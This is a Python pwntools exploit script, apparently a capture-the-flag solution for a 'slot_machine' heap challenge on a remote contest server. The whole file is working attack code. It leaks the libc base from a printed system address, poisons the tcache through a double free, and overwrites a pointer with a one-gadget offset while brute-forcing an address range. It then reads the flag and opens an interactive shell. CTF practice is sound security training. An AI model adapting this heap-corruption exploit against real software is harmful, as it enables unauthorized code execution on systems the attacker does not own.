#! /usr/bin/env python
# -*- coding: utf-8 -*-
#
# Copyright © 2018 hzshang <hzshang15@gmail.com>

from pwn import *
context.log_level="debug"
pwn_file="./slot_machine"
elf=ELF(pwn_file)
libc=ELF("./bc.so.6")
#libc=ELF("./libc.so.6")
#heap_add=0
#stack_add=0
def exp(off):
    if len(sys.argv)==1:
         #r=remote("127.0.0.1",60002)
         r=process("./slot_machine")
         pid=r.pid
    else:
         r=remote("arcade.fluxfingers.net",1815)
         pid=0

    def debug():
        log.debug("process pid:%d"%pid)
        #log.debug("stack add:0x%x"%stack_add)
        #log.debug("heap add:0x%x"%heap_add)
        log.debug("libc add:0x%x"%libc.address)
        pause()

    def add(size):
        r.sendlineafter("bye!\n","1")
        r.sendlineafter("How much?\n",str(size))

    def free(off):
        r.sendlineafter("bye!\n","2")
        r.sendlineafter("where?\n",str(off))

    def write(con):
        r.sendlineafter("bye!\n","3")
        r.sendafter("what?\n",con)

    try:
        r.recvuntil("Here is system : ")
        libc.address=0
        libc.address=int(r.recvline()[:-1],16)-libc.sym["system"]
        add(0x100)
        free(0)
        free(0)
        add(0x100)
        write(p64(libc.address+off+0xf10))
        #write(p64(libc.address+0x1be000))
        add(0x100)
        add(0x100)
        pause()
        write(p64(libc.address+0x45254))
        r.recvline()
        r.sendline("cat flag")
        data=r.recvline()
        r.interactive()
        return True
    except Exception as e:
        r.close()
        return False

for off in range(0x1f0000,0x300000,0x1000):
    try:
        print hex(off)
        if exp(off):
            break
    except Exception as e:
        sleep(2)
        continue









